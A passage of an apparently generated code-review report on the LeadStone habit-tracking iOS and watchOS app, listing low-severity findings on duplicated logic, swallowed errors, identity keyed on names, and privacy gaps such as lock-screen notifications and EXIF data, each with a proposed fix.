The rule "the goal applies unless the date's weekday is excluded" is written out three times: Metric.isGoalDay(on:calendar:) (Metric.swift:276), WatchMetricSnapshot.isGoalDay(on:calendar:) here, and a third copy inside NotificationService (NotificationService.swift:333-334: `let weekday = Calendar.current.component(.weekday, from: date); return !excludedWeekdays.contains(weekday)`). The snapshot copy even carries a comment promising it mirrors the Metric one. Three copies of calendar-component logic is exactly the kind of thing that drifts when someone changes, say, the weekday convention or adds a calendar parameter to one site.

**Fix.** Add one free function or a small extension, e.g. `func isGoalDay(_ date: Date, excludedWeekdays: Set<Int>, calendar: Calendar) -> Bool`, in a shared file, and have Metric, WatchMetricSnapshot, and NotificationService call it.


<a id="f-57"></a>
#### 🔵 LOW · `Shared/Services/CSVImporter.swift:28`

**CSV schema is duplicated as two independent string literals plus parallel magic column indices**

CSVImporter.expectedHeader and the private CSVExporter.header (CSVExporter.swift:65) are the same 8-column string maintained in two files, and the column order is restated a third time as bare indices in ParsedRow (fields[0], fields[1], fields[2], fields[3], fields[4], fields[6], fields[7] — note field 5, Duration, is silently unused). docs/FEATURE_IDEAS.md already plans adding note/quality columns; whoever does that must update three unlinked places or exports stop importing / rows shift silently.

**Fix.** Introduce a shared `CSVSchema` (an enum of columns with `index` and `title`), derive both the exporter's header and the importer's expectedHeader from it, and index ParsedRow fields via the enum (e.g. `fields[CSVSchema.value.index]`).


<a id="f-58"></a>
#### 🔵 LOW · `Shared/Services/CSVImporter.swift:248`

**MetricCache uses Dictionary(uniqueKeysWithValues:) keyed by metric name, which traps if two metrics ever share a name**

Metric's `#Unique` constraint is on `stableID`, not `name`; name uniqueness is enforced only by a UI check in MetricFormView (`nameIsDuplicate` disabling Save). `Dictionary(uniqueKeysWithValues:)` calls fatalError on a duplicate key, so any path that ever produces two same-named metrics (a future creation path, a sync merge, direct model manipulation, or a regression in the one view that guards it) turns CSV import into a crash. The projects dictionary right below correctly tolerates collisions by assignment; the metrics one does not. This is hidden coupling between a service's crash-safety and a single view's validation.

**Fix.** Use `Dictionary(existing.map { ($0.name, $0) }, uniquingKeysWith: { first, _ in first })`, or key by a normalized name with an explicit collision policy.


<a id="f-59"></a>
#### 🔵 LOW · `Shared/Services/GoalPace.swift:122`

**GoalPace hard-codes Calendar.current with no injection seam, unlike every sibling service**

> 🔁 **Independently confirmed by both reviews** — this session's max-effort pass also surfaced this: GoalPace divides by a hardcoded 86400, wrong on DST days.

goalDays and elapsedGoalFraction reach for `Calendar.current` internally while the public entry points (weekly/forWeek) accept only `asOf`. Sibling services in the same folder (GoalCoach, GoalSummary, ComplicationProgress, ExportRange, HealthDailyMirror, AspirationAlignment) all take a `calendar:` parameter. Week boundaries depend on firstWeekday (Sunday vs Monday) and time zone, so GoalPace's tests are environment-dependent and its results can disagree with a caller that computed "the week" with a different calendar. Additionally `dayProgress` divides by a fixed `secondsPerDay = 86400`, so on a 23/25-hour DST day the elapsed fraction is slightly wrong (clamped, but the pace expectation drifts).

**Fix.** Add `calendar: Calendar = .current` to weekly/forWeek and thread it through goalDays/elapsedGoalFraction/dayProgress; compute the day's length as `startOfNextDay.timeIntervalSince(today)` instead of 86400.


<a id="f-60"></a>
#### 🔵 LOW · `Shared/Services/Insight.swift:161`

**streakSaver detail copy hard-codes threshold values that live as constants in MeasureHealth**

The detail string bakes in "a quarter of your usual size", "after 9 pm", and "this month", which restate MeasureHealth.saverValueShare (0.25), saverLateHour (21), and lookbackDays (28). The neighboring goalClustering case does this right — it interpolates `MeasureHealth.clusterBand` — so the file is internally inconsistent. Tuning any saver constant makes the shipped copy silently describe a detector that no longer exists.

**Fix.** Interpolate the MeasureHealth constants into the streakSaver copy the way goalClustering already does (e.g. derive "9 pm" from saverLateHour and the fraction wording from saverValueShare), or add a comment on the constants pointing at the copy that must move with them.


<a id="f-61"></a>
#### 🔵 LOW · `Shared/Services/MarkdownExportWindow.swift:62`

**Metric+project session qualification/dedup logic duplicated across three services**

MarkdownExportWindow.completedSessions and IntentionProgress.qualifyingSessions (Shared/Services/IntentionProgress.swift:82) both hand-roll the same rule: gather `metric.sessions + metric.projects.flatMap(\.sessions)`, drop running sessions, filter by startedAt (half-open), and de-duplicate via an ObjectIdentifier Set. AspirationRollup.contributionSources implements a third variant, and its header comment even claims 'the de-dup and unit rules live in one place'. The two copies here acknowledge each other only through prose ('the IntentionProgress convention'), so a future change to the double-count rule (e.g. attributing by endedAt, or counting a project moved between metrics) must be found and applied in every copy by grep.

**Fix.** Extract one shared helper, e.g. `Metric.completedSessions(in range: DateInterval?)` or a SessionCollection utility that performs gather + dedup + isRunning + half-open startedAt filtering, and have IntentionProgress, MarkdownExportWindow, and (where applicable) AspirationRollup call it.


<a id="f-62"></a>
#### 🔵 LOW · `Shared/Services/MarkdownExporter.swift:71`

**Export feature shows users the internal name 'lead track' while every other user-visible surface says 'LeadStone'**

The canonical user-facing name is unambiguously LeadStone: all four targets set INFOPLIST_KEY_CFBundleDisplayName = LeadStone (pbxproj:913, 958, 1077, 1113), every usage-description string uses it (pbxproj:916-919, e.g. "Authenticate to unlock LeadStone."), and in-app copy consistently matches (AppLockView.swift:12, AppLockService.swift:62 Face ID reason "Unlock LeadStone", WatchRootView.swift:9 navigationTitle, WatchTimerWidget.swift:101, MetricHealthSections.swift:61,95, MetricFormHealthExportSection.swift:29). The two outliers are user-visible: the exported markdown artifact opens with "# lead track — data export" (MarkdownExporter.swift:71) and describes itself as 'A plain-text export from "lead track"' (line 89), and the export screen tells the user the CSV is "for importing back into lead track" (DataExportView.swift:68) — a name that appears nowhere else the user ever sees. File/store slugs (lead-track-export.csv, group.plastickarma.lead-track) are internal identifiers and fine to leave.

**Fix.** Rename the display strings in MarkdownExporter.swift:71,89 and DataExportView.swift:68 to LeadStone (the markdown preamble is explicitly written for an LLM reader, so the name mismatch with the app actively misleads). Keep bundle IDs, filenames, and the App Group untouched.


<a id="f-63"></a>
#### 🔵 LOW · `Shared/Services/MeasureHealth.swift:162`

**detectNarrowing accepts a Calendar it never uses while its windows are raw 86400-second math**

detectNarrowing declares `calendar _: Calendar = .current` — a discarded parameter that misleads callers into thinking calendar/timezone matters — while CountedSource computes its 30-day recent/prior windows with `Double(monocultureWindowDays) * 24 * 3600` and addingTimeInterval, and hasHistory does the same for its month guard. Every other window in this codebase (inWindow in this same file, OversubscriptionInsight.tally) uses calendar.date(byAdding:) day math. For a fuzzy heuristic the DST drift (±1h twice a year) is tolerable, but the dead parameter plus the inconsistency with the file's own inWindow helper is a trap for the next editor.

**Fix.** Either use the calendar (compute recentStart/priorStart via calendar.date(byAdding: .day, value: -30/-60, to: startOfDay(now)), matching inWindow) or drop the parameter entirely so the signature stops promising calendar-awareness it doesn't have.


<a id="f-64"></a>
#### 🔵 LOW · `Shared/Services/NotificationService.swift:177`

**Weekly-review UserDefaults keys and defaults duplicated as raw strings across two files**

> 🔁 **Independently confirmed by both reviews** — this session's max-effort pass also surfaced this: weeklyReview UserDefaults keys/defaults duplicated with 3 fallback idioms.

"weeklyReviewEnabled", "weeklyReviewDay", "weeklyReviewHour", "weeklyReviewMinute" appear as inline string literals both here and in lead track/Views/WeeklyReviewSettingsView.swift (@AppStorage lines 5-8). The default values are also duplicated and read through three different, inconsistent access patterns in this one function: `bool(forKey:)`, `object(forKey:) as? Int ?? 9`, `integer(forKey:)`, and a bespoke `stored > 0 ? stored : 2` fallback in weeklyReviewDay. A typo or a changed default in one file silently desynchronizes the settings UI from the scheduler.

**Fix.** Centralize the four keys and their defaults in one shared type (e.g. enum WeeklyReviewSettings with static key constants and default values), used by both @AppStorage and NotificationService, and pick one read pattern (register defaults or `object as? Int ?? default`) for all numeric keys.


<a id="f-65"></a>
#### 🔵 LOW · `Shared/Services/SessionStatistics.swift:187`

**Trailing-window and day-count date math duplicated despite existing helpers**

> 🔁 **Independently confirmed by both reviews** — this session's max-effort pass also surfaced this: SessionStatistics trailing-window cutoff inlined 3x despite windowCutoff helper.

The private windowCutoff(days:) helper (line 145) exists precisely to compute the day-aligned trailing-window lower bound, yet the identical byAdding .day, value: -(days - 1) expression is re-inlined in recentAverage (lines 51-55), recentAverageSessionsPerDay (lines 187-190) and recentAverageSessionLength (lines 209-212). Likewise the days-since-first-total computation (dateComponents([.day]...).day.map { max($0 + 1, 1) } ?? 1) is copy-pasted verbatim in overallAverage (lines 65-69) and averageSessionsPerDay (lines 175-179). Six sites now encode the same off-by-one-sensitive calendar math; a fix to the window convention (e.g. the -(days - 1) inclusivity) must be applied in four places or the averages and totals silently diverge.

**Fix.** Route the three recent* functions through windowCutoff(days:) and extract a daysSince(_ first: Date) helper shared by overallAverage and averageSessionsPerDay.


<a id="f-66"></a>
#### 🔵 LOW · `Shared/Services/StopTimerIntent.swift:51`

**Live Activities matched by metric display name instead of stable ID**

StopTimerIntent collects the display names of stopped sessions' metrics and ends any Activity whose attributes.metricName matches. TimerActivityAttributes (Shared/Models/TimerActivityAttributes.swift:10) carries only metricName, no stableID, so identity is stringly-typed on a user-editable field. Two metrics sharing a name will end each other's Live Activities when one is stopped; renaming a metric while its timer runs leaves an orphaned Live Activity that the targeted stop can never match (only the metricID.isEmpty stop-all path clears it). Everywhere else in the sync/intent layer (WatchAction, StartTimerIntent, TimerControlWidget) identity is the stableID UUID; this is the one seam still keyed on name.

**Fix.** Add the metric's stableID (uuidString) to TimerActivityAttributes and match activities on it in endActivities, keeping metricName purely for display. Fall back to name matching only for activities created by older builds if needed.


<a id="f-67"></a>
#### 🔵 LOW · `Shared/Services/TodayGrouping.swift:15`

**stableID-with-name-fallback identity pattern re-inlined at 10+ sites with a collision-prone fallback**

The expression stableID?.uuidString ?? title/name is duplicated across TodayGrouping.swift:15, TodayClusters.swift:43, WeeklyReviewAspirationWeeks.swift:125 and :160, WeeklyReviewIntentions.swift:61-62, GoalSeason.swift:102 and ClusterCardView.swift:98-100 — even though WeeklyReview already centralizes it as stableID(of:) (WeeklyReview.swift:206-212). The 'unaligned' sentinel string is likewise duplicated in TodayClusters.swift:42 and WeeklyReviewMetricGroups.swift:50 (and asserted literally in tests). Beyond the duplication, the fallback itself is fragile: two pre-backfill aspirations sharing a title (or two moments with identical text, WeeklyReviewAspirationWeeks.swift:160) produce colliding Identifiable ids, which breaks ForEach identity and pager scroll restoration. Any future change to the identity scheme must touch every file.

**Fix.** Add a single stableIdentity computed property (or protocol extension) on Metric/Aspiration/Intention/Moment and a shared constant for the 'unaligned' sentinel; have all groups, clusters, lines and review models call it.


<a id="f-68"></a>
#### 🔵 LOW · `Shared/Services/WatchSyncCodec.swift:11`

**Encode failure degrades to an empty dictionary that is then 'successfully' pushed — one non-finite value in the store permanently and silently kills watch sync**

context(for:) returns [:] when JSONEncoder throws, and PhoneWatchSyncService.push() happily calls updateApplicationContext([:]) and records lastPushed = snapshot as if the transfer carried data; the watch decodes nil and ignores it. JSONEncoder throws on any non-finite Double by default, and one CAN enter the store: CSVImporter.swift:236 parses session values with `Double(fields[6]...)`, which accepts "nan"/"inf", and WatchActionHandler applies action.value without a finiteness check. A single NaN session value makes SessionStatistics.todayTotal NaN for that metric, so EVERY subsequent snapshot encode throws — all pushes and all sendMessage replies become [:] from then on. The watch renders its last cache forever, with no error surfaced anywhere on either device.

**Fix.** Reject non-finite (and negative) values at the boundaries (CSV import, WatchActionHandler); in the codec, log/assert on encode failure and return nil instead of [:]; in push(), do not set lastPushed (and do not call updateApplicationContext) when encoding produced no payload.


<a id="f-69"></a>
#### 🔵 LOW · `lead track/Services/HealthMetricSyncService.swift:82`

**User-initiated 'Sync Now' swallows every failure with try?**

The connect path (documented as the explicit Sync Now button) chains three silent `try?`s: `try? await reader.requestReadAccess` (line 43), `try? await reader.dayTotals` (line 82, which aborts refresh via guard), and `try? context.save()` (line 91). A user who taps Sync Now while HealthKit errors (store unavailable, protected-data locked, query failure) gets no error, no log, and — because refresh returns before stamping — not even an updated lastHealthSyncAt to hint that nothing happened. Callers cannot distinguish 'synced, no changes' from 'sync failed'.

**Fix.** Make refresh return a Result/throw and have the Sync Now UI surface failures (the silent scene-phase refreshAll path can still discard them deliberately, with a Logger line). Keep the guard-return so a failed fetch never deletes mirrored sessions — that part is correct.


<a id="f-70"></a>
#### 🔵 LOW · `lead track/Services/HealthMetricSyncService.swift:149`

**Health service scaffolding duplicated across two singletons**

HealthMetricSyncService and HealthSessionExportService duplicate their entire non-domain skeleton: an identical lazy `store()` (lines 149-154 vs HealthSessionExportService.swift 98-103), identical `isAvailable`, an identical `connect(metricID:container:)` shape (find metric -> unwrap source/target -> request auth with `try?` -> run), an identical all-metrics loop gated on a predicate fetch (`healthLinkedMetrics` vs `exportingMetrics`), and identical `try? context.fetch(...) ?? []` fallbacks. Each also creates its own private HKHealthStore, contrary to the usual one-store-per-app guidance — two independent stores means two places to reason about authorization state. Any fix to this plumbing (logging, error surfacing, store sharing) must now be made twice and can drift.

**Fix.** Extract the shared plumbing: a single app-wide HKHealthStore provider (or inject the store), plus a small helper like `func healthMetrics(matching: Predicate<Metric>, in: ModelContext) -> [Metric]` and a generic connect flow parameterized by the auth request. The domain-specific refresh/export bodies stay where they are.


<a id="f-71"></a>
#### 🔵 LOW · `lead track/Services/HealthSessionExportService.swift:75`

**Swallowed save after Health write can duplicate Health records**

export() writes each pending session to HealthKit (send() stamps `session.healthExportedAt = .now` only after a successful write), then persists all stamps with a single `try? context.save()`. If that save fails, the HealthKit writes have already succeeded but every stamp is lost — the next exportAll pass (fires on every scene-phase change) re-treats the same sessions as pending and writes duplicate mindful sessions/workouts into the user's Health store. The comment on send() ('a failed write leaves the session unstamped, so the next pass simply retries') documents the write-failure case but the inverse failure mode — write succeeded, stamp not persisted — is unhandled and invisible.

**Fix.** Save (and check the result) per successful write, or at least log the save failure; consider stamping before writing and clearing on write failure, or deduplicating via HKMetadataKeyExternalUUID set to the session's stable ID so re-writes are idempotent.


<a id="f-72"></a>
#### 🔵 LOW · `lead track/Views/AspirationAttachPicker.swift:4`

**Two parallel attach pickers duplicate the same selection semantics; AttachPicker's doc comment is stale**

> 🔁 **Independently confirmed by both reviews** — this session's max-effort pass also surfaced this: two aspiration attach pickers show contradictory selected-state for the same data.

AspirationAttachPicker (Form/Toggle style, used only by AspirationAttachSheet) and AspirationFeedPicker (card style, used only by AspirationFormView) independently implement identical business rules: metric selection subsumes its projects, project rows disable while the parent metric is selected, projects sorted by startedAt, and toggle-in/out of Set<Metric>/Set<Project> bindings. Any change to the subsumption rule (e.g. auto-clearing selectedProjects when a metric is selected) must be made twice and can silently drift. The header comment on AttachPicker still claims it is 'Shared by the create/edit form and the detail screen's "Add" sheet', but the create/edit form switched to AspirationFeedPicker — the comment now misleads a maintainer into thinking edits here affect the form.

**Fix.** Extract the shared selection model (subsumption rule, bindings, sorted-projects, feed count) into one small type both views render from, or converge on a single picker with a style parameter. At minimum fix the stale 'Shared by the create/edit form' doc comment.


<a id="f-73"></a>
#### 🔵 LOW · `lead track/Views/AspirationAttachedListView.swift:37`

**Canonical display-order comparators re-hand-rolled in four files**

The app's display order for attached items — metrics by createdAt ascending, projects by startedAt ascending — is re-implemented as inline sort closures in AspirationAttachedListView (lines 37-43), AspirationAttachPicker.sortedProjects (line 49-51), AspirationFeedPicker.sortedProjects (line 208-210), and AspirationDetailView.attachedSummary (lines 250-251). If the canonical order ever changes (e.g. alphabetical), one site will inevitably be missed and the 'Attached' summary, the attach pickers, and the attached list will disagree about ordering.

**Fix.** Define the order once, e.g. 'extension Collection where Element == Project { var inDisplayOrder: [Project] }' (and the same for Metric, or a static SortDescriptor on the models), and use it at all four sites.


<a id="f-74"></a>
#### 🔵 LOW · `lead track/Views/ClusterStubView.swift:47`

**Divider-between-enumerated-rows pattern duplicated across cluster views with a shared magic inset**

ClusterStubView.intentionRows (lines 47-56) and ClusterCardView.rows (lines 79-89) implement the same construct: `ForEach(Array(items.enumerated()), id: \.element.id)` emitting a row plus a trailing `Divider().padding(.leading, 42)` for all but the last element. The 42pt hairline inset (which must visually match the 30pt icon column + 12pt spacing used by the rows) is hard-coded in both places; changing the row anatomy requires finding and updating both, and the last-row/insight-line boundary logic differs subtly between them.

**Fix.** Extract a small shared helper (e.g. `DividedRows(items:) { row }` or a `clusterRowDivider()` modifier plus a named constant for the inset) so the separator convention lives in one place.


<a id="f-75"></a>
#### 🔵 LOW · `lead track/Views/CountdownStartView.swift:58`

**Hour/minute stepper form and seconds conversion duplicated with DurationEntryView**

CountdownStartView (lines 39-42, 58-60) and DurationEntryView (lines 16-25, 50-52) both hand-roll the same UI (two Steppers, 0...23 h / 0...59 min) and the same conversion `TimeInterval(hours * 3600 + minutes * 60)` plus a `duration == 0` disabled/guard pair. Any change to the input style (e.g. switching to a wheel picker, allowing >23h, seconds granularity) must be made twice.

**Fix.** Extract a shared `HourMinuteDurationPicker(hours:minutes:)` view (or a `@State var duration: Duration` + binding helpers) exposing a computed `duration`, and reuse it in both sheets.


<a id="f-76"></a>
#### 🔵 LOW · `lead track/Views/DailyGoalItem.swift:8`

**Excluded-weekday data shuttles between three representations with untyped Int weekday indices**

Rest days travel as raw calendar weekday Ints in inconsistent shapes: DailyGoalItem takes `[Int]` and does its own `Calendar.current.component(.weekday, from: .now)` check (lines 8, 13-16); DetailedStatisticsView also holds `[Int]` and converts to `Set(excludedWeekdays)` at each call site (lines 156, 162); GoalSettingsView edits `Set<Int>` and stores `.sorted()`; Metric exposes yet another `excludedWeekdaySet`. Each boundary re-encodes the same concept, the 1=Sunday convention is implicit everywhere, and the 'is today a rest day' rule exists both here and in `Metric.isGoalDay`/GoalSummary (the doc comment on DayDialView says they must agree). The hard-coded `.now`/`Calendar.current` inside `isRestDay` also makes this small rule untestable.

**Fix.** Standardize on one type (e.g. a `RestDays` wrapper or at least `Set<Int>` end-to-end) with a single `isRestDay(on:calendar:)` implementation shared by DailyGoalItem, GoalSummary, and Metric.isGoalDay, taking Date/Calendar as parameters for testability.


<a id="f-77"></a>
#### 🔵 LOW · `lead track/Views/GoalSettingsView.swift:342`

**Stored-vs-display unit conversion is duplicated as inverse magic-number math 300 lines apart**

> 🔁 **Independently confirmed by both reviews** — this session's max-effort pass also surfaced this: GoalSettings x60/x3600 stored-vs-display conversion mirrored 300 lines apart.

The daily goal is edited in minutes and stored in seconds; the weekly goal is edited in hours and stored in seconds; count metrics use raw values. This convention exists twice as raw arithmetic that must stay mutually inverse: init reads `(metric.dailyGoal ?? 1800) / 60` and `(weekly ?? 18000) / 3600` (lines 30-41), while `saveAmountGoals` writes `dailyGoalValue * 60` and `weeklyGoalValue * 3600` (lines 342-351). The `isCount` branch is repeated four times, and the defaults (1800, 18000, 10, 50) are unnamed. IntentionFormView.storedTarget (line 224, `amount * 3600`) repeats the hours-to-seconds rule a third time. Changing the display unit or a default requires touching all sites in sync, with no compiler help.

**Fix.** Introduce a small conversion helper, e.g. `enum GoalUnit { case daily(MeasurementType), weekly(MeasurementType); func display(fromStored:) / stored(fromDisplay:); var defaultDisplayValue: Double }` in Shared/, and use it from both init and save (and from IntentionFormView). It would also be testable in the Linux overlay.


<a id="f-78"></a>
#### 🔵 LOW · `lead track/Views/MetricFoldsCard.swift:212`

**Session value/label rendering duplicated between the History fold and SessionRowView**

MetricFoldsCard.sessionValue (lines 212-218) re-implements the value-rendering decision tree that already exists in SessionRowView.valueLabel (SessionRowView.swift lines 33-52): binary -> "Done", session.value -> ValueFormatter count, else DurationFormatter duration. The fold's preview rows and the full list behind "Show all" (MetricSessionsListView, which uses SessionRowView) are two renderings of the same data one tap apart, so any drift is directly user-visible — and one drift already exists: SessionRowView checks session.metric?.measurementType while the fold checks the outer metric, and SessionRowView has a running-session branch the fold silently lacks (directSessions filters running out, but that invariant lives in a different file).

**Fix.** Move the value-formatting decision into one place — e.g. a Session extension `displayValue(unit:)` or reuse SessionRowView (it already supports showsDate: false) inside the fold, keeping only the fold-specific day+time label local.


<a id="f-79"></a>
#### 🔵 LOW · `lead track/Views/MetricFormView.swift:176`

**Health-connect save paths swallow persistence failures with try? and duplicate each other**

connectHealthIfNeeded (line 176) and connectHealthExport (line 189) both do `try? modelContext.save()` and then launch a detached Task that hands the metric's stableID to a shared service which re-reads it from the container. If save() throws, the metric (or its changed export flag) is not persisted, the background service will find no metric / stale state for that ID, and the user sees a form that appeared to save successfully — the Health permission prompt and backfill silently never happen. The two functions are also structural near-duplicates (guard stableID, try? save, capture container, Task -> shared service.connect), so a fix to one is easy to miss in the other.

**Fix.** Handle the save failure explicitly (do/catch that at minimum logs, ideally keeps the form open with an error) and collapse the two functions into one helper taking the service call as a parameter, e.g. persistThenConnect(_ metric: Metric, connect: (UUID, ModelContainer) async -> Void).


<a id="f-80"></a>
#### 🔵 LOW · `lead track/Views/WeekShareView.swift:60`

**Hero text, hero caption, and date-range formatting duplicated between WeekShareView and WeekHeaderStrip**

WeekShareView.heroText (line 60-64) is character-for-character identical to WeekHeaderStrip.heroText (WeekHeaderStrip.swift:116-120), WeekShareView.formattedRange (line 45-48) is identical to WeekHeaderStrip.formattedRange (WeekHeaderStrip.swift:75-78), and heroCaption implements the same 'sessions · N of 7 days' composition twice with slightly different wording ("days active" vs "days"). The shared PNG export and the on-screen header are supposed to tell the same story; with the logic forked, a copy or rule change (e.g. when totalDuration leads) will drift between the share image and the screen — the caption wording already has.

**Fix.** Hoist these as presentation helpers on WeeklyReview (e.g. `review.heroText`, `review.formattedRange`, `review.heroCaption(includeSessions:)`) or into a small shared WeekHeroPresentation type consumed by both views.


<a id="f-81"></a>
#### 🔵 LOW · `lead track/Views/WeeklyReviewGoalSeasons.swift:129`

**seasonMetric(for:) duplicates the metric(for:) lookup that already exists on the same view**

WeeklyReviewGoalSeasons.swift:129-131 defines `seasonMetric(for:)` as `metrics.first { $0.stableID?.uuidString == row.id }`, which is the exact stableID-string lookup WeeklyReviewView.swift:203-205 already exposes as `metric(for:)` — deliberately made internal (per its own doc comment) so sibling files can use it. Two copies of the ID-matching convention mean a future change (e.g. matching on persistentModelID instead of stableID strings) must be found in both places.

**Fix.** Delete seasonMetric(for:) and call `metric(for: row.id)` from renewSeason, adjustSeason, and the Retire button.


<a id="f-82"></a>
#### 🔵 LOW · `lead-track Watch App/WatchSyncController.swift:50`

**All WatchConnectivity send errors are discarded with zero diagnostics**

In send(_:fallback:), the error passed to sendMessage's errorHandler is thrown away ('{ _ in handler() }'), and for refresh requests (no fallback) errorHandler is nil, so a failed sendMessage vanishes entirely — the user just sees a stale snapshot with no trace in logs. The queued-delivery degradation itself is a sound design (the doc comment covers it), but when sync misbehaves in the field there is no signal anywhere on the watch side to distinguish 'unreachable, queued' from 'sendMessage failed with error X' from 'reply was undecodable' (receive(context:) also returns silently on decode failure at line 65-66).

**Fix.** Add an os.Logger to WatchSyncController and log the discarded Error in the errorHandler closure, the unreachable/queued fallback path, and the guard-else in receive(context:). This is a one-time, few-line change that makes every future sync bug diagnosable from a sysdiagnose.


<a id="f-83"></a>
#### 🔵 LOW · `lead-track Watch Widget/WatchGoalsWidget.swift:37`

**Timeline-building boilerplate duplicated across three providers, and the running-timer predicate has already diverged**

WatchGoalsProvider.getTimeline (lines 32-46), WatchDayRingProvider.getTimeline (WatchDayRingWidget.swift lines 26-41), and WatchMetricProvider.timeline (WatchMetricWidget.swift lines 29-44) all repeat the same shape: load WatchSnapshotCache, compute a hasRunningTimer flag, call ComplicationTimeline.entryDates, map dates to entries, return .atEnd. The copies have already drifted: the Goals provider treats ANY running timer as live ('snapshot.metrics.contains { $0.runningSince != nil }'), while the Day Ring provider correctly restricts to timers that affect what it renders ('ComplicationProgress.metrics(...).contains { $0.hasActiveTarget && $0.isRunning }'). Since goalLines only shows metrics with an active target, a running timer on a goal-less or rest-day metric makes the Goals widget pre-render 12 identical live entries (2 hours at 10-minute spacing, extended by .atEnd) that change nothing on screen — wasted widget refresh budget and a divergence future editors will copy one way or the other.

**Fix.** Add a shared builder, e.g. 'ComplicationTimeline.timeline(hasRunningTimer:makeEntry:) -> Timeline<E>' (or a snapshot-loading helper in Shared/Services next to ComplicationTimeline), and route all three providers through it. Fix the Goals predicate to match Day Ring's hasActiveTarget && isRunning check, since that is the condition under which its rendered lines actually change.


<a id="f-84"></a>
#### 🔵 LOW · `lead-track Widget/ScoreboardWidget.swift:65`

**try? swallows shared-store failures, rendering a misleading 'No metrics yet' state**

loadMetrics() returns [] both when the user genuinely has no metrics and when SharedModelContainer.create() or the fetch throws (`try?` twice, no logging). The view then shows the emptyView 'No metrics yet', which is wrong and misleading when the real problem is a store-open failure (e.g. app-group misconfiguration or a migration error) — exactly the class of failure a maintainer needs to see. TimerControlWidget.swift lines 81–85 have the same pattern (`try? SharedModelContainer.create()` / `try? Metric.find`), where a store failure renders as the 'Choose a metric' unconfigured state even for a correctly configured widget.

**Fix.** At minimum log the error (os.Logger) before returning the empty result; better, make ScoreboardEntry/TimerControlEntry carry a loadFailed flag so the widget can render a distinct 'Couldn't load data' state instead of impersonating the empty/unconfigured states.


<a id="f-85"></a>
#### 🔵 LOW · `lead-track Widget/ScoreboardWidget.swift:79`

**MetricSnapshot uses metric name as its Identifiable id, but names are not unique**

MetricSnapshot.id is set to metric.name, and the snapshot is rendered via ForEach(visibleMetrics) which relies on Identifiable. In Shared/Models/Metric.swift the #Unique constraint is on stableID only (line 11: `#Unique<Metric>([\.stableID])`); name has no uniqueness guarantee. Two metrics with the same name produce duplicate ForEach identities (undefined rendering, wrong-row diffs). It is also inconsistent with TimerControlWidget, which correctly keys metrics by stableID.uuidString, so the widget target has two different identity conventions for the same model.

**Fix.** Use metric.stableID?.uuidString as the snapshot id (skipping or falling back for nil, as SelectMetricIntent.durationMetrics already does with compactMap), so both widgets share one identity convention.


<a id="f-86"></a>
#### 🔵 LOW · `lead-track Widget/TimerControlWidget.swift:91`

**Empty-string stableID fallback silently maps onto StopTimerIntent's 'stop ALL timers' sentinel**

makeState(for:) does `stableID: metric.stableID?.uuidString ?? ""`. The metric was just looked up via Metric.find(stableID:) so its stableID cannot actually be nil here — the fallback is unreachable, but it hides that invariant and is dangerous if the call path ever changes: StopTimerIntent treats an empty metricID as "stop every running timer" (Shared/Services/StopTimerIntent.swift line 46: `metricID.isEmpty || session.metric?.stableID?.uuidString == metricID`), and StartTimerIntent with "" silently no-ops. A future caller of makeState with a non-find-derived Metric would get a Stop button with stop-all blast radius. The empty-string sentinel itself is a stringly-typed cross-file protocol documented only in a comment in StopTimerIntent.

**Fix.** Pass the already-validated id string from state(for:)/metric(withID:) into makeState (e.g. makeState(for: metric, id: id)) instead of re-deriving it with a sentinel fallback; longer term, replace the empty-string convention on StopTimerIntent with an explicit optional/`stopAll` parameter.



**privacy**

<a id="f-87"></a>
#### 🔵 LOW · `Shared/Services/CSVExporter.swift:21`

**Export writes to a fixed temp path with try?, so a failed write silently shares a stale previous export; the file is never cleaned up**

exportFile() writes the CSV to a constant path (temporaryDirectory/lead-track-export.csv) with 'try?' and returns the URL unconditionally. If the write fails (disk full, protection state, encoding issue), ShareLink in DataExportView.swift:139 will share whatever file was left there by an earlier export — potentially a wider scope/date range than the user just selected (e.g. the user narrows to one metric / last 7 days but shares a previous 'all time, all metrics' file). Independently, the full export lingers in tmp indefinitely after sharing with only the default data-protection class, so a complete copy of the user's tracking history (including HealthKit-mirrored session data) sits outside the store after every export. MarkdownExporter.swift:26 has the same pattern.

**Fix.** Remove any pre-existing file (or use a unique per-export filename), propagate the write error instead of 'try?' so the share sheet is never handed a stale URL, and delete the temp file after the share completes (or write it into a caches subdirectory you clear on launch).


<a id="f-88"></a>
#### 🔵 LOW · `Shared/Services/NotificationService.swift:266`

**Notification content embeds metric names, streaks and weekly totals — visible on the lock screen even when the app lock is on**

Reminder, streak, countdown and weekly-review notifications interpolate user data into title/body: "Time to \(metric.name.lowercased())", "\(metric.name) streak at risk", and the weekly body embeds session counts and tracked-time totals. These render on the lock screen and in the notification center regardless of the Face ID app lock (the settings footer even advertises that notifications keep working while locked). For a habit tracker, metric names themselves can be the sensitive datum (health conditions, addictions, therapy), so the lock protects the UI while the lock screen broadcasts what is tracked.

**Fix.** Offer a 'discreet notifications' option (generic title like "Time to check in", metric name only in the body or omitted), enabled automatically when the app lock is on; alternatively document that users should rely on the system Show Previews > When Unlocked setting.


<a id="f-89"></a>
#### 🔵 LOW · `lead track/Services/MomentLocationReader.swift:92`

**Location usage description says data "never leaves your iPhone" but coordinates are sent to Apple's geocoding service**

INFOPLIST_KEY_NSLocationWhenInUseUsageDescription (project.pbxproj:919) promises: "It is never tracked in the background and never leaves your iPhone." But MomentLocationReader.reverseGeocode calls CLGeocoder().reverseGeocodeLocation, a network service that transmits the coordinates to Apple's servers to resolve the place name. The claim is factually wrong, which is both an App Review honesty risk and a broken user promise. (Similarly, NSHealthShareUsageDescription's "Your health data never leaves your iPhone" is imprecise: WatchSnapshotBuilder includes health-linked metrics' todayTotal in the snapshot pushed to the paired watch and cached in the watch's app-group UserDefaults.)

**Fix.** Reword the usage string honestly, e.g. "Your location is used only to label the moments you choose to keep; coordinates are sent once to Apple's geocoding service to name the place, and are never tracked in the background." Soften the HealthKit string to acknowledge the paired-watch sync.


<a id="f-90"></a>
#### 🔵 LOW · `lead track/Views/AspirationFormView.swift:222`

**Aspiration cover photo stored as raw picker bytes, retaining EXIF metadata including GPS location**

